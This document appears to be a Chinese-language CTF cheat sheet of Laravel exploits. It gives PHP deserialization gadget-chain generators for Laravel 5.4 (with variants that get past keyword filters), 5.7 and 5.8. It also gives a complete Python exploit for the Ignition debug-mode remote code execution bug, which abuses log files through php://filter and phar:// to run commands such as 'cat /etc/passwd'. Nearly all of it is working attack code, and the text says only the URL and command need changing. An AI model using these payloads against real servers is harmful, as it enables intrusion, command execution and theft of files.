## **Laravel5.4反序列化**
入口：xx.com/admin/序列化串
如果生产payload罕有`/`，需要进行url编码，这里需要进行两次编码`%252f`
```
<?php
namespace Mockery\Generator {
    class MockConfiguration {
        protected $name = 'fallingskies';
    }
    class MockDefinition {
        protected $config;
        protected $code;
        public function __construct() {
            $this->config = new MockConfiguration();
            $this->code = "<?php system('cat /flag');?>";
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Illuminate\Bus {
    use Mockery\Loader\EvalLoader;
    class Dispatcher {
        protected $queueResolver;
        public function __construct() {
            $this->queueResolver = [new EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Bus\Dispatcher;
    use Mockery\Generator\MockDefinition;
    class BroadcastEvent {
        public $connection;
        public function __construct() {
            $this->connection = new MockDefinition();
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

^
## **有过滤**
过滤1
```
Route::get('/', function () {
    return view('welcome');
});
Route::get('admin/{obj}',function($s){
	if(preg_match('/defaultChannel|listeners|Bus|messages|CallQueuedClosure/i', base64_decode($s))){
		die('other way');
	}
	if($s){
		unserialize(base64_decode($s));
		return 'unserialize done'.$s;
	}else{
		return 'unserialize error'.$s;
	}
});
```

```
<?php
namespace Illuminate\Broadcasting
{
    use Faker\ValidGenerator;
    class PendingBroadcast
    {
        protected $events;
        public function __construct($cmd)
        {
            $this->events = new ValidGenerator($cmd);
        }
    }
    $seri = new PendingBroadcast('cat /flag');
    echo base64_encode(serialize($seri));
}

namespace Faker
{
    use Faker\DefaultGenerator;
    class ValidGenerator
    {
        protected $maxRetries;
        protected $validator;
        protected $generator;
        public function __construct($cmd)
        {
            $this->generator = new DefaultGenerator($cmd);
            $this->maxRetries = 10000000;
            $this->validator = 'system';
        }

    }
}

namespace Faker
{
    class DefaultGenerator
    {
        protected $default;
        public function __construct($cmd)
        {
            $this->default = $cmd;
        }
    }
}
?>
```
过滤2
```
if(preg_match('/defaultChannel|Validation|Bus|messages|CallQueuedClosure/i', base64\_decode($s))){ die('other way'); }
```
```
<?php
namespace Illuminate\Broadcasting
{
    use  Illuminate\Events\Dispatcher;
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($cmd)
        {
            $this->events = new Dispatcher($cmd);
            $this->event=$cmd;
        }
    }
    echo base64_encode(serialize(new PendingBroadcast('cat /flag')));
}


namespace Illuminate\Events
{
    class Dispatcher
    {
        protected $listeners;
        public function __construct($event){
            $this->listeners=[$event=>['system']];
        }
    }
}
```
过滤3
```
if(preg_match('/listeners|Validation|Bus|messages|CallQueuedClosure/i', base64\_decode($s))){ die('other way'); }
```
```
<?php
namespace Illuminate\Notifications {
    class ChannelManager {
        protected $app;
        protected $customCreators;
        protected $defaultChannel;
        public function __construct() {
            $this->app = 'cat /flag';
            $this->defaultChannel = 'fallingskies';
            $this->customCreators = ['fallingskies' => 'system'];
        }
    }
}


namespace Illuminate\Broadcasting {
    use  Illuminate\Notifications\ChannelManager;
    class PendingBroadcast {
        protected $events;
        public function __construct()
        {
            $this->events = new ChannelManager();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```


^
## **Laravel5.7反序列化**
```
<?php

namespace Illuminate\Foundation\Testing {
    class PendingCommand
    {
        public $test;
        protected $app;
        protected $command;
        protected $parameters;

        public function __construct($test, $app, $command, $parameters)
        {
            $this->test = $test;                 //一个实例化的类 Illuminate\Auth\GenericUser
            $this->app = $app;                   //一个实例化的类 Illuminate\Foundation\Application
            $this->command = $command;           //要执行的php函数 system
            $this->parameters = $parameters;     //要执行的php函数的参数  array('id')
        }
    }
}

namespace Faker {
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}

namespace Illuminate\Foundation {
    class Application
    {
        protected $instances = [];

        public function __construct($instances = [])
        {
            $this->instances['Illuminate\Contracts\Console\Kernel'] = $instances;
        }
    }
}

namespace {
    $defaultgenerator = new Faker\DefaultGenerator(array("hello" => "world"));

    $app = new Illuminate\Foundation\Application();

    $application = new Illuminate\Foundation\Application($app);

    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, 'system', array('cp /f* 1.txt')); //此处执行命令

    echo urlencode(serialize($pendingcommand));
}
```

^
## **Laravel5.8反序列化**
```
<?php
namespace Illuminate\Broadcasting{

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct(){
            $this->events=new Dispatcher();
            $this->event=new QueuedCommand();
        }
    }
}
namespace Illuminate\Foundation\Console{

    use Mockery\Generator\MockDefinition;

    class QueuedCommand
    {
        public $connection;
        public function __construct(){
            $this->connection=new MockDefinition();
        }
    }
}
namespace Illuminate\Bus{

    use Mockery\Loader\EvalLoader;

    class Dispatcher
    {
        protected $queueResolver;
        public function __construct(){
            $this->queueResolver=[new EvalLoader(),'load'];
        }
    }
}
namespace Mockery\Loader{
    class EvalLoader
    {

    }
}
namespace Mockery\Generator{
    class MockDefinition
    {
        protected $config;
        protected $code;
        public function __construct()
        {
            $this->code="<?php phpinfo();exit()?>"; //此处是PHP代码
            $this->config=new MockConfiguration();
        }
    }
    class MockConfiguration
    {
        protected $name="feng";
    }
}

namespace{

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
}
```


^
## **Laravel开启了Debug模式Ignition组件反序列化漏洞**

Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。

Laravel <= 8.4.2
打开配置文件 laravel/config/app.php，找到 'debug’项为true（开启debug模式）

运行exp还需要php，python3，linux环境，下载放在同一级目录下
使用时只需要修改exp中的URL和命令即可
```
#!/usr/bin/python3

import requests as req
import os, uuid


class Exp:
    __gadget_chains = {
        "monolog_rce1": r""" php -d 'phar.readonly=0' phpggc/phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt""",
        "monolog_rce2": r""" php -d 'phar.readonly=0' phpggc/phpggc monolog/rce2 system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt""",
        "monolog_rce3": r""" php -d 'phar.readonly=0' phpggc/phpggc monolog/rce3 system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt""",
    }  # phpggc链集合，暂时添加rce1后续再添加其他增强通杀能力

    __delimiter_len = 8  # 定界符长度

    def __vul_check(self):
        resp = req.get(self.__url, verify=False)
        if resp.status_code != 405 and "laravel" not in resp.text:
            return False
        return True

    def __payload_send(self, payload):
        header = {
            "Accept": "application/json"
        }
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": ""
            }
        }
        data["parameters"]["viewFile"] = payload
        resp = req.post(self.__url, headers=header, json=data, verify=False)
        # print(resp.text)
        return resp

    def __command_handler(self, command):
        """
        因为用户命令要注入到payload生成的命令中，为了防止影响结构，所以进行一些处理。
        """

        self.__delimiter = str(uuid.uuid1())[:self.__delimiter_len]  # 定界符用于定位页面中命令执行结果的位置。
        # print(delimiter)
        command = "echo %s && %s && echo %s" % (self.__delimiter, command, self.__delimiter)
        # print(command)

        escaped_chars = [' ', '&', '|']  # 我只想到这么多，可自行添加。
        for c in escaped_chars:
            command = command.replace(c, '\\' + c)
        # print(command)
        return command

    def __clear_log(self):
        return self.__payload_send(
            "php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

    def __gen_payload(self, gadget_chain):
        gen_shell = self.__gadget_chains[gadget_chain] % (self.__command)
        # print(gen_shell)
        os.system(gen_shell)
        with open('payload.txt', 'r') as f:
            payload = f.read().replace('\n', '') + 'a'  # 添加一个字符使得两个完整的payload总是只有一个可以正常解码
        os.system("rm payload.txt")
        # print(payload)
        return payload

    def __decode_log(self):
        return self.__payload_send(
            "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

    def __unserialize_log(self):
        return self.__payload_send("phar://../storage/logs/laravel.log/test.txt")

    def __rce(self):
        text = self.__unserialize_log().text
        # print(text)

        echo_find = text.find(self.__delimiter)
        # print(echo_find)
        if echo_find >= 0:
            return text[echo_find + self.__delimiter_len + 1: text.find(self.__delimiter, echo_find + 1)]
        else:
            return "[-] RCE echo is not found."

    def exp(self):
        for gadget_chain in self.__gadget_chains.keys():
            print("[*] Try to use %s for exploitation." % (gadget_chain))
            self.__clear_log()
            self.__clear_log()
            self.__payload_send('a' * 2)
            self.__payload_send(self.__gen_payload(gadget_chain))
            self.__decode_log()
            print("[*] Result:")
            print(self.__rce())

    def __init__(self, target, command):
        self.target = target
        self.__url = req.compat.urljoin(target, "_ignition/execute-solution")
        self.__command = self.__command_handler(command)
        if not self.__vul_check():
            print("[-] [%s] is seems not vulnerable." % (self.target))
            print("[*] You can also call obj.exp() to force an attack.")
        else:
            self.exp()


def main():
    Exp("http://127.0.0.1:8888", "cat /etc/passwd")


if __name__ == '__main__':
    main()
```


